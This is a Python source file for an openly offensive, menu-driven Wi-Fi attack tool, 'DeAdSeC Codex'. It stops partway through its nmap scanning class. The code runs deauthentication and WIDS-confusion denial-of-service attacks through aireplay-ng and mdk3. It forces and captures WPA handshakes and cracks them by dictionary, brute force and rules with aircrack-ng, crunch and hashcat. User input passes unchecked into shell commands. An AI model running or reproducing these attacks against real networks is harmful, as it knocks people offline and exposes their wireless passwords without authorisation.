#-----------Welcome to DeAdSeC Python Codex----------#
#-------Made By DeAdSeC-------#
#---Version 2.0.0---#

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#IMPORT DEPENDENCYS
import sys
import os
import json
import subprocess
import time
import pandas
import nmap
import netifaces
#IMPORT UTILS
from utils.colors import *
from utils.ExtraVariables import *
#Variables
TraceBack = 1         # 0 For OFF | 1 For ON
#AIRODUMP VARIABLES
FileName = 'AiroDumpOutPut' #You can edit this variable
Directory = 'Data/Aircrack-ng/' #You can edit this variable
FileNameCSV = f'{FileName}-01.csv' #Dont edit this variable
ExplorePath = os.path.isfile(f'{Directory}{FileNameCSV}') #Dont edit this variable
#TRACEBACK
sys.tracebacklimit = TraceBack
#NMAP
nm = nmap.PortScanner()

#OS to clean the screen
def OS():
    os.system('cls' if os.name == 'nt' else 'clear')

#First class to run to check everything
class Verify():

    #CHECK ADIMIN PRIVIVILEDGES [ROOT]
    def CheckAdminPrivs():

        if os.geteuid() != 0:
            print(C + Banner)
            print()
            exit(f'{Danger} {R}Error: Need to be run as {O}root\n{Danger} {R}Re-Run it but with {O} sudo {W}')
        else:
            return Verify.LoadJson()

    #LOADS JSON FILES
    def LoadJson():

        global newinterface

        with open('Data/DATA.json') as f:
            data = json.load(f)

        for DefaultInfo in data['DefaultInfo']:
            newinterface = DefaultInfo['defaultinterface']

        return Verify.DefaultInterface()

    #CHECKS IF INTERFACE IS IN MONITOR OR MANAGED
    def CheckInterfaceState():

        global interface
        global mode

        process = subprocess.Popen(['cat', f'/sys/class/net/{newinterface}/carrier'], stdout = subprocess.PIPE)
        text = str(process.communicate()[0])
        CleanText = text[2:-3]

        if CleanText == '1':
            interface = newinterface
            mode = 'managed'
            return Menus.StartMenu()

        if CleanText != '1':
            interface = newinterface + 'mon'
            mode = 'monitor'
            return Menus.StartMenu()

        else:
            OS()
            print(f'Problem loading interface please check line 45')
            input(f'Press {O}ENTER{W} to continue')
            sys.exit()

    #CHECKS FOR EXISTING DEFAULT INETERFACE
    def DefaultInterface():

            global newinterface

            #Netifaces
            NetworkInterfaces = netifaces.interfaces()

            if newinterface == 'NONE':
                OS()
                print(f'{B}********** Please select your default interface **********{W}')
                print(*(W + '{}) {}'.format(x, y) for (x, y) in enumerate(NetworkInterfaces, 1)), sep='\n')
                print()
                print(f'{C}----------')
                print(f'{G}Note: You can change the interface later if you need!')
                print(f'{C}----------')
                print(f'{P}Contribution: We are looking for a way to make it so you dont need to write the hole interface name and only a number!')
                print(f'{C}----------{W}')
                print()
                newinterface = input('Please write your new default interface: ')

                data['DefaultInfo'][0]['defaultinterface'] = defaultinterface = newinterface
                with open('Data/DATA.json', 'w') as f:
                    json.dump(data, f, indent = 2)

                return Verify.CheckInterfaceState()
            else:
                return Verify.CheckInterfaceState()

#Class with all the menus
class Menus():

    #StartMenu
    def StartMenu():

        global Menu

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Welcome to Codex ************{W}')
        print('0) Exit script')
        print('1) WEB Attacks')
        print('2) Network Attacks')
        print('3) Offline WPA/WPA2 decrypt')
        print(f'{B}**************** Options *****************{W}')
        print('4) Change interface')
        print(f'{B}************ Default Files ***************{W}')
        print('5) Change default ip address [NMAP]')
        print('6) Change default port range [NMAP]')
        print('7) Change default interface')
        print('')
        print(f'{C}----------{W}')
        print(f'{W}Interface {O}{interface}{W} selected. Mode {O}{mode}{W}.')
        print(f'{C}----------{W}')
        print(f'{G}Note: {W}In case you cant change from monitor to managed restart you pc!')
        print(f'{C}----------{W}')
        print(f'{P}Contribution:{W} If you find any bug please help me fix it or report it to me!')
        print(f'{C}----------{W}')

        OptionMenu = int(input())

        if OptionMenu == 0:
            if mode == 'monitor':
                print(f'Would you like to preserve {O}monitor{W} mode?')
                PO = input()
                if PO == 'Y':
                    print('Exiting script!')
                    return sys.exit()
                if PO == 'y':
                    print('Exiting script!')
                    return sys.exit()
                if PO == 'N':
                    return InterfaceOptions.managed('EXIT')
                if PO == 'n':
                    return InterfaceOptions.managed('EXIT')
                else:
                    print(f'Please use only {O}Y|N{W} or {O}y|n{W}!')
                    input(f'Press {O}ENTER{W} to continue!')
                    return Menus.StartMenu()
            else:
                print('Exiting script!')
                return sys.exit()
        if OptionMenu == 1:
            return Menus.WEB()
        if OptionMenu == 2:
            return Menus.NET()
        if OptionMenu == 3:
            return Menus.OFFLINE_DECRYPT()
        if OptionMenu == 4:
            return Tools.InterfaceSelect('StartMenu')
        if OptionMenu == 5:
            return Defaults.IP()
        if OptionMenu == 6:
            return Defaults.PortRange()
        if OptionMenu == 7:
            return Defaults.Interface()
        else:
            print(f'Please use only numbers between {O}1{W} and{O} 6{W}')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.StartMenu()

    #NET MENU
    def NET():

        global Menu

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Network Attack Menu ************{W}')
        print('0) Return to main menu')
        print('1) Select another network interface')
        print('2) Put interface in monitor mode')
        print('3) Put interface in managed mode')
        print(f'4) Explore for targets {O}[Monitor Mode Needed]{W}')
        print(f'{C}----------{W}')
        print('5) DoS Attack menu')
        print('6) HandShake Tools menu')
        print('7) WPA/WPA2 decrypt menu')
        print('8) Evil twin attack menu')
        print('9) NMAP menu')
        print('')
        print(f'{C}----------{W}')
        print(f'{W}Interface {O}{interface} {W}selected. Mode {O}{mode}{W}.')
        print(f'{C}----------{W}')
        print(f'Select ESSID: {O}{essid}{W}')
        print(f'Selected BSSID: {O}{bssid}{W}')
        print(f'Selected Channel: {O}{channel}{W}')
        print(f'Type of Encryption: {O}{encrypt}{W}')
        print(f'{C}----------{W}')
        print(f'{G}NOTE:{W} In case you cant change from monitor to managed restart you pc!')
        print(f'{C}----------{W}')
        print(f'{P}Contribution:{W} If you find any bug please help me fix it or report it to me!')
        print(f'{C}----------{W}')
        OptionNet = int(input())

        if OptionNet == 0:
            return Menus.StartMenu()
        if OptionNet == 1:
            return InterfaceOptions.InterfaceSelect('NET')
        if OptionNet == 2:
            return InterfaceOptions.monitor('NET')
        if OptionNet == 3:
            return InterfaceOptions.managed('NET')
        if OptionNet == 4:
            if mode == 'monitor':
                return AiroDump.Explorer('NET')
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return Menus.NET()
        if OptionNet == 5:
            return Menus.DOS()
        if OptionNet == 6:
            return Menus.HANDSHAKE()
        if OptionNet == 7:
            pass
        if OptionNet == 8:
            pass
        if OptionNet == 9:
            return NMAPScan.menu()

    #WEB MENU
    def WEB():

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Web Attack Menu ************{W}')
        print('0) Exit script')
        print('1) Full Website Check')
        print('2) SQL Injection')

        OptionWeb = int(input())

        if OptionWeb == 0:
            return StartMenu()
        if OptionWeb == 1:
            pass
        if OptionWeb == 2:
            pass

    #DOS MENU
    def DOS():

        global Menu

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(B + '************ Dos Attack Menu ************' + W)
        print('0) Return to NET menu')
        print('1) Select another network interface')
        print('2) Put interface in monitor mode')
        print('3) Put interface in managed mode')
        print(f'4) Explore for targets {O}[Monitor Mode Needed]{W}')
        print(f'{C}----------{W}')
        print(f'5) Deauth mdk3 attack {O}[Monitor Mode Needed]{W}')
        print(f'6) Deauth aireplay attack {P}[Most Effective] {O}[Monitor Mode Needed]{W}')
        print(f'7) WIDS | WIPS | WDS Confusion attack {O}[Monitor Mode Needed]{W}')
        print('')
        print(f'{C}----------{W}')
        print(f'{W}Interface {O}{interface} {W}selected. Mode {O}{mode}{W}.')
        print(f'{C}----------{W}')
        print(f'Select ESSID: {O}{essid}{W}')
        print(f'Selected BSSID: {O}{bssid}{W}')
        print(f'Selected Channel: {O}{channel}{W}')
        print(f'Type of Encryption: {O}{encrypt}{W}')
        print(f'{C}----------{W}')
        print(f'{G}NOTE:{W} In case you cant change from monitor to managed restart you pc!')
        print(f'{C}----------{W}')
        print(f'{P}Contribution:{W} If you find any bug please help me fix it or report it to me!')
        print(f'{C}----------{W}')

        DosOption = int(input())

        if DosOption == 0:
            return Menus.NET()
        if DosOption == 1:
            return InterfaceOptions.InterfaceSelect('DOS')
        if DosOption == 2:
            return InterfaceOptions.monitor('DOS')
        if DosOption == 3:
            return InterfaceOptions.managed('DOS')
        if DosOption == 4:
            if mode == 'monitor':
                return AiroDump.Explorer('NET')
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return Menus.DOS()
        if DosOption == 5:
            if mode == 'monitor':
                return Attacks.MDK3()
            if mode == 'managed':
                print(f'{Danger} Please put your card in{O} monitor {W}mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return DOS(interface)
        if DosOption == 6:
            if mode == 'monitor':
                return Attacks.Aireplay()
            if mode == 'managed':
                print(f'{Danger} Please put your card in{O} monitor {W}mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return DOS(interface)
        if DosOption == 7:
            if mode == 'monitor':
                return Attacks.Confusion()
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return DOS()
        else:
            print(f'{Danger} Please only use numbers between {O}0{W} and{O} 7{W}')
            input(f'{Danger} Click {O}ENTER{W} to continue')
            return DOS()

    #HANDSHAKE MENU
    def HANDSHAKE():

        global Menu

        Dir = "Data/HandShakes"
        ListDir = os.listdir(Dir)

        #Will search for items that end in .cs and .netxml and deleat them!
        for item in ListDir:
            if item.endswith('.csv'):
                os.remove(os.path.join(Dir, item))
            if item.endswith('.netxml'):
                os.remove(os.path.join(Dir, item))

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(B + '************ HandShake Attack Menu ************' + W)
        print('0) Return to NET menu')
        print('1) Select another network interface')
        print('2) Put interface in monitor mode')
        print('3) Put interface in managed mode')
        print(f'4) Explore for targets {O}[Monitor Mode Needed]{W}')
        print(f'{C}----------{W}')
        print(f'5) Capture Handshake {C}[MDK3] {O}[Monitor Mode Needed]{W}')
        print(f'6) Capture Handshake {C}[Aireplay] {P}[Most Effective] {O}[Monitor Mode Needed]{W}')
        print('')
        print(f'{C}----------{W}')
        print(f'{W}Interface {O}{interface} {W}selected. Mode {O}{mode}{W}.')
        print(f'{C}----------{W}')
        print(f'Select ESSID: {O}{essid}{W}')
        print(f'Selected BSSID: {O}{bssid}{W}')
        print(f'Selected Channel: {O}{channel}{W}')
        print(f'Type of Encryption: {O}{encrypt}{W}')
        print(f'{C}----------{W}')
        print(f'{G}NOTE:{W} In case you cant change from monitor to managed restart you pc!')
        print(f'{C}----------{W}')
        print(f'{P}Contribution:{W} If you find any bug please help me fix it or report it to me!')
        print(f'{C}----------{W}')

        HandOption = int(input())

        if HandOption == 0:
            return Menus.NET()
        if HandOption == 1:
            return InterfaceOptions.InterfaceSelect('HANDSHAKE')
        if HandOption == 2:
            return InterfaceOptions.monitor('HANDSHAKE')
        if HandOption == 3:
            return InterfaceOptions.managed('HANDSHAKE')
        if HandOption == 4:
            if mode == 'monitor':
                return AiroDump.Explorer('HANDSHAKE')
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return Menus.HANDSHAKE()
        if HandOption == 5:
            if mode == 'monitor':
                return Attacks.HandShake('MDK3')
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return Menus.HANDSHAKE()
        if HandOption == 6:
            if mode == 'monitor':
                return Attacks.HandShake('Aireplay')
            if mode == 'managed':
                print(f'{Danger} Please put your card in {O}monitor{W} mode before using this!')
                input(f'{Danger} Click {O}ENTER{W} to continue')
                return Menus.HANDSHAKE()

    #OFFLINE_DECRYPT MENU
    def OFFLINE_DECRYPT():

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(B + '************ HandShake Decrypt Menu ************' + W)
        print('0) Return to main menu')
        print(f'{C}----------{W}')
        print(f'1) Dictionary attack against capture file {O}[Aircrack]{W}')
        print(f'2) Bruteforce attack against capture file {O}[Aircrack + Crunch]{W}')
        print(f'{C}----------{W}')
        print(f'3) Dictionary attack against capture file {O}[HashCat]{W}')
        print(f'4) Bruteforce attack against capture file {O}[HashCat]{W}')
        print(f'5) Rule based attack against capture file {O}[HashCat]{W}')
        print('')
        print(f'{C}----------{W}')
        print(f'{P}Contribution:{W} If you know how we can automate the .cap to .hccapx process plz let us know!')
        print(f'{C}----------{W}')
        offlineOption = int(input())

        if offlineOption == 0:
            return Menus.StartMenu()
        if offlineOption == 1:
            return Bruteforce.DicAircrack()
        if offlineOption == 2:
            return Bruteforce.BruteAircrack()
        if offlineOption == 3:
            return Bruteforce.DicHashcat()
        if offlineOption == 4:
            return Bruteforce.BruteHashcat()
        if offlineOption == 5:
            return Bruteforce.RuleHashcat()

#Class for interface settings
class InterfaceOptions():

    #Select new interface
    def InterfaceSelect(Menu):

        global interface

        #Netifaces
        NetworkInterfaces = netifaces.interfaces()

        OS()
        print()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}********** Please select an interface **********')
        print(*(W + '{}) {}'.format(x, y) for (x, y) in enumerate(NetworkInterfaces, 1)), sep='\n')
        print()
        print(f'{C}----------')
        print(f'{G}Note: {W}Please write the interface the way it shows in the menu!')
        print(f'{C}----------')
        print(f'{P}Contribution: {W}We are looking for a way to make it so you dont need to write the hole interface name and only a number!')
        print(f'{C}----------{W}')
        print()
        interface = input('Please write the interface you want to use: ')
        if Menu == 'StartMenu':
            return Menus.StartMenu()
        if Menu == 'NET':
            return Menus.NET()
        if Menu == 'DOS':
            return Menus.DOS()
        if Menu == 'HANDSHAKE':
            return Menus.HANDSHAKE()
        else:
            return Menus.StartMenu()

    def monitor(Menu):

        global mode
        global interface

        if mode == 'managed':
            OS()
            os.system(f'sudo airmon-ng start {interface}')
            interface = interface + 'mon'
            process = subprocess.Popen(['iw', interface, 'info'], stdout=subprocess.PIPE)
            text = str(process.communicate()[0])
            begin = 'ttype'
            end = 'twiphy'
            CleanFile = text[text.find(begin):text.find(end)]
            mode = CleanFile[6:-3]

            print()
            print(f'{W}Interface now in {O}monitor{W} mode!')
            input(f'Press {O}ENTER{W} to continue!')
            if Menu == 'NET':
                return Menus.NET()
            if Menu == 'DOS':
                return Menus.DOS()
            if Menu == 'HANDSHAKE':
                return Menus.HANDSHAKE()
            else:
                return Menus.NET()

        else:
            print(f'You wifi card is already in {O}monitor{W} mode!')
            input(f'Press {O}ENTER{W} to continue!')
            if Menu == 'NET':
                return Menus.NET()
            if Menu == 'DOS':
                return Menus.DOS()
            if Menu == 'HANDSHAKE':
                return Menus.HANDSHAKE()
            else:
                return Menus.NET()

    def managed(Menu):

        global mode
        global interface

        if mode == 'monitor':
            OS()
            os.system(f'sudo airmon-ng stop {interface}')
            interface = interface[:-3]
            process = subprocess.Popen(['iw', interface, 'info'], stdout=subprocess.PIPE)
            text = str(process.communicate()[0])
            begin = 'ttype'
            end = 'twiphy'
            CleanFile = text[text.find(begin):text.find(end)]
            mode = CleanFile[6:-3]

            print()
            print(f'{W}Interface now in {O}managed{W} mode!')
            input(f'Press {O}ENTER{W} to continue')
            if Menu == 'NET':
                return Menus.NET()
            if Menu == 'DOS':
                return Menus.DOS()
            if Menu == 'HANDSHAKE':
                return Menus.HANDSHAKE()
            if Menu == 'EXIT':
                print('Exiting script')
                return sys.exit()
            else:
                return Menus.NET()
        else:
            print(f'You wifi card is already in {O}manged{W} mode!')
            input(f'Press {O}ENTER{W} to continue!')
            if Menu == 'NET':
                return Menus.NET()
            if Menu == 'DOS':
                return Menus.DOS()
            if Menu == 'HandShake':
                return Menus.HANDSHAKE()
            if Menu == 'EXIT':
                print('Exiting script')
                return sys.exit()
            else:
                return Menus.NET()

#Class for general attacks
class Attacks():

    def MDK3():
        input(f'Click {O}ENTER{W} to continue')
        time.sleep(1)
        print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} d -c {channel}')
        print(f'{R}CTRL-C detected! Ending attack!{W}')
        time.sleep(1)
        return Menus.DOS()

    def Aireplay():
        input(f'Click {O}ENTER{W} to start attack')
        print(f'Changing channel to {O}{channel}{W} ...')
        os.system(f'sudo iwconfig {interface} channel {channel}')
        time.sleep(1)
        print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
        print(f'{R}CTRL-C detected! Ending attack!{W}')
        time.sleep(1)
        return Menus.DOS()

    def Confusion():
        input(f'Click {O}ENTER{W} to start attack')
        time.sleep(1)
        print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} w -e {essid} -c {channel}')
        print(f'{R}CTRL-C detected! Ending attack!{W}')
        time.sleep(1)
        return Menus.DOS()

    def HandShake(Type):

        if Type == 'Aireplay':
            FileName = str(input(f'Please enter a name for your HandShake file {P}[Default:HandShake]{W}: '))
            if FileName == '':
                FileName = 'HandShake'
                print(f'Press {O}ENTER{W} to start attack')
                print(f'Changing channel to {O}{channel}{W} ...')
                os.system(f'sudo iwconfig {interface} channel {channel}')
                time.sleep(1)
                print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
                print(f'{R}Ending attack ...{W}')
                time.sleep(1)
                print(f'HandShake file saved in {O}Data/HandShakes{W}')
                input(f'Press {O}ENTER{W} to continue!')
                return Menus.HANDSHAKE()
            else:
                print(f'Press {O}ENTER{W} to start attack')
                print(f'Changing channel to {O}{channel}{W} ...')
                os.system(f'sudo iwconfig {interface} channel {channel}')
                time.sleep(1)
                print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
                print(f'{R}CTRL-C detected! Ending attack!{W}')
                time.sleep(1)
                print(f'HandShake file saved in {O}Data/HandShakes{W}')
                input(f'Press {O}ENTER{W} to continue!')
                return Menus.HANDSHAKE()
        if Type == 'MDK3':
            FileName = str(input(f'Please enter a name for your HandShake file {P}[Default:HandShake]{W}: '))
            if FileName == '':
                FileName = 'HandShake'
                print(f'Press {O}ENTER{W} to start attack')
                print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
                print(f'HandShake file saved in {O}Data/HandShakes{W}')
                input(f'Press {O}ENTER{W} to continue!')
                return Menus.HANDSHAKE()
            else:
                print(f'Press {O}ENTER{W} to start attack')
                print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
                print(f'HandShake file saved in {O}Data/HandShakes{W}')
                input(f'Press {O}ENTER{W} to continue!')
                return Menus.HANDSHAKE()

#Class for airodump-ng
class AiroDump():

    def Explorer(Menu):
        if ExplorePath == True:
            os.remove(f'{Directory}{FileNameCSV}')
            os.system(f'xterm -geometry 100x20-0+0 -e sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
            return AiroDump.Decoder(Menu)
        else:
            os.system(f'sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
            return AiroDump.Decoder(Menu)

    def Decoder(Menu):

        global bssid
        global channel
        global essid
        global encrypt

        CS = pandas.read_csv(f'{Directory}{FileNameCSV}')
        stop_row = CS[CS.BSSID == 'Station MAC'].index[0] -1

        OS()
        df = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
        df = df.drop(df.columns[[1, 2, 4, 6, 7, 9, 10, 11, 12, 14]], axis=1)
        print(df)
        print()
        ColectedInput = int(input('Please enter the number of the network: '))

        number = 0
        while number < 1000:
            if ColectedInput == number:
                #GET THE SELECTED ROW
                out = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
                out = out.drop(out.columns[[1, 2, 4, 6, 7, 9, 10, 11, 12, 14]], axis=1)
                out = out.iloc[[number]]
                #GET BSSID
                bssid = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
                bssid = bssid.drop(bssid.columns[[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]], axis=1)
                bssid = bssid.iloc[[number]]
                bssid = bssid.to_string(index=False, header=False)
                bssid = bssid.lstrip()
                #GET CHANNEL
                channel = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
                channel = channel.drop(channel.columns[[0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]], axis=1)
                channel = channel.iloc[[number]]
                channel = channel.to_string(index=False, header=False)
                channel = channel.lstrip()
                #GET ESSID
                essid = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
                essid = essid.drop(essid.columns[[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14]], axis=1)
                essid = essid.iloc[[number]]
                essid = essid.to_string(index=False, header=False)
                essid = essid.lstrip()
                #GET ENCRYPTION
                encrypt = pandas.read_csv(f'{Directory}{FileNameCSV}', nrows = stop_row)
                encrypt = encrypt.drop(encrypt.columns[[0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14]], axis=1)
                encrypt = encrypt.iloc[[number]]
                encrypt = encrypt.to_string(index=False, header=False)
                encrypt = encrypt.lstrip()

                if Menu == 'DOS':
                    return Menus.DOS()
                if Menu == 'NET':
                    return Menus.NET()
                if Menu == 'HANDSHAKE':
                    return Menus.HANDSHAKE()
                else:
                    return Menus.NET()
            number = number + 1

class Bruteforce():

    def DicAircrack():
        print('Please enter full path for handshake file: ')
        handshakePath = str(input())
        print('Please enter full path for your wordlist: ')
        wordlistPath = str(input())
        HSPVerify = os.path.isfile(f'{handshakePath}')
        WLPVerify = os.path.isfile(f'{wordlistPath}')
        print(f'{O}Checking paths ...{W}')
        time.sleep(1)
        if HSPVerify == True:
            if WLPVerify == True:
                print(f'Starting dictionary attack ... {O}[CTRL-C to exit]{W}')
                time.sleep(2)
                os.system(f'sudo aircrack-ng -w {wordlistPath} {handshakePath}')
                print(f'{R}Dictionary attack finished ...{W}')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
            else:
                print('WordList path is wrong please try again!')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
        else:
            print('HandShake path is wrong please try again!')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()
    def BruteAircrack():
        print('Please enter full path for handshake file: ')
        handshakePath = str(input())
        print('Please enter minium password length: ')
        MinPassLength = str(input())
        print('Please enter max password length: ')
        MaxPassLength = str(input())
        print(f'Please enter the network name {O}[If the network name has spaces write it like this "Example\ Password "]{W}:')
        NetWorkName = str(input())
        HSPVerify = os.path.isfile(f'{handshakePath}')
        print(f'{O}Checking paths ...{W}')
        time.sleep(1)
        if HSPVerify == True:
            print(f'{R}WARNING: This process will take a lot of time!{W}')
            print(f'Starting bruteforce ... {O}[CTRL-C to exit]{W}')
            time.sleep(2)
            os.system(f'sudo crunch {MinPassLength} {MaxPassLength} abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -e {NetWorkName} -w - {handshakePath}')
            print(f'{R}Brutefoce attack finished ...{W}')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()
        else:
            print('HandShake path is wrong please try again!')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()
    def DicHashcat():
        print(f'Please enter full path for handshake file {O}[.hccapx]{W}: ')
        handshakePath = str(input())
        print('Please enter full path for your wordlist: ')
        wordlistPath = str(input())
        HSPVerify = os.path.isfile(f'{handshakePath}')
        WLPVerify = os.path.isfile(f'{wordlistPath}')
        print(f'{O}Checking paths ...{W}')
        time.sleep(1)
        if HSPVerify == True:
            begin = '.'
            HSP = handshakePath
            HSPFormat = HSP[HSP.find(begin):]
            if HSPFormat == '.hccapx':
                if WLPVerify == True:
                    print(f'Starting dictionary attack ... {O}[CTRL-C to exit]{W}')
                    time.sleep(2)
                    os.system(f'sudo hashcat -a 0 -m 2500 {handshakePath} {wordlistPath} --force')
                    print(f'{R}Dictionary attack finished ...{W}')
                    input(f'Press {O}ENTER{W} to continue')
                    return Menus.OFFLINE_DECRYPT()
                else:
                    print('WordList path is wrong please try again!')
                    input(f'Press {O}ENTER{W} to continue')
                    return Menus.OFFLINE_DECRYPT()
            else:
                print(f'{R}HashCat only supports .hccapx format!{W}')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
        else:
            print(f'{R}HandShake path is wrong please try again!{W}')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()
    def BruteHashcat():
        print('Please enter full path for handshake file: ')
        handshakePath = str(input())
        print('Please enter minium password length: ')
        MinPassLength = str(input())
        print('Please enter max password length: ')
        MaxPassLength = str(input())
        HSPVerify = os.path.isfile(f'{handshakePath}')
        print(f'{O}Checking paths ...{W}')
        time.sleep(1)
        if HSPVerify == True:
            begin = '.'
            HSP = handshakePath
            HSPFormat = HSP[HSP.find(begin):]
            if HSPFormat == '.hccapx':
                print(f'{R}WARNING: This process will take a lot of time!{W}')
                print(f'Starting bruteforce ... {O}[CTRL-C to exit]{W}')
                time.sleep(2)
                os.system(f'sudo hashcat  -m 2500 -a 3 --increment --increment-min={MinPassLength} --increment-max={MaxPassLength} {handshakePath} --force')
                print(f'{R}Brutefoce attack finished ...{W}')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
            else:
                print(f'{R}HashCat only supports .hccapx format!{W}')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
        else:
            print('HandShake path is wrong please try again!')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()
    def RuleHashcat():
        print(f'Please enter full path for handshake file {O}[.hccapx]{W}: ')
        handshakePath = str(input())
        print('Please enter full path for your rule file: ')
        rulePath = str(input())
        print('Please enter full path for your wordlist: ')
        wordlistPath = str(input())
        HSPVerify = os.path.isfile(f'{handshakePath}')
        WLPVerify = os.path.isfile(f'{wordlistPath}')
        RPVerify = os.path.isfile(f'{rulePath}')
        print(f'{O}Checking paths ...{W}')
        time.sleep(1)
        if HSPVerify == True:
            begin = '.'
            HSP = handshakePath
            HSPFormat = HSP[HSP.find(begin):]
            if HSPFormat == '.hccapx':
                if WLPVerify == True:
                    if RPVerify == True:
                        print(f'Starting rule attack ... {O}[CTRL-C to exit]{W}')
                        time.sleep(2)
                        os.system(f'sudo hashcat  -m 2500 -r {rulePath} {handshakePath} {wordlistPath} --force')
                        print(f'{R}Dictionary attack finished ...{W}')
                        input(f'Press {O}ENTER{W} to continue')
                        return Menus.OFFLINE_DECRYPT()
                    else:
                        print('Rule path is wrong please try again!')
                        input(f'Press {O}ENTER{W} to continue')
                        return Menus.OFFLINE_DECRYPT()
                else:
                    print('WordList path is wrong please try again!')
                    input(f'Press {O}ENTER{W} to continue')
                    return Menus.OFFLINE_DECRYPT()
            else:
                print(f'{R}HashCat only supports .hccapx format!{W}')
                input(f'Press {O}ENTER{W} to continue')
                return Menus.OFFLINE_DECRYPT()
        else:
            print(f'{R}HandShake path is wrong please try again!{W}')
            input(f'Press {O}ENTER{W} to continue')
            return Menus.OFFLINE_DECRYPT()

#Class for namp-scanner
class NMAPScan():

    def Scan():

        global state
        global host
        global scanned_hosts
        global All_IP
        global All_TCP
        global All_UDP
        global All_SCTP
        global Has_TCP
        global Has_UPD
        global Has_SCTP

        #Will make a scan of the network and organise the info in string!
        nm.scan(defaultipaddr, portrange, '-v')

        state = nm[defaultipaddr].state()
        host = nm[defaultipaddr].hostname()
        scanned_hosts = str(nm.all_hosts())
        All_TCP = str(nm[defaultipaddr].all_tcp())
        All_UDP = str(nm[defaultipaddr].all_udp())
        All_SCTP = str(nm[defaultipaddr].all_sctp())
        All_IP = str(nm[defaultipaddr].all_ip())

    def FullNetworkScan():

        #Will run Scan function so it can organize print and log all the info!
        NMAPScan.Scan()
        #Will print the data colected
        OS()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Colected Data ************{W}')
        print(f'{Plus} Ip Status: {O}{state}{W}')
        print(f'{Plus} Port Range: {O}{portrange}{W}')
        print(f'{Plus} HostName: {O}{host}{W}')
        print(f'{Plus} Scanned Hosts: {O}{scanned_hosts}{W}')
        print(f'{Plus} Open TCP Ports: {O}{All_TCP}{W}')
        print(f'{Plus} Open UDP Ports: {O}{All_UDP}{W}')
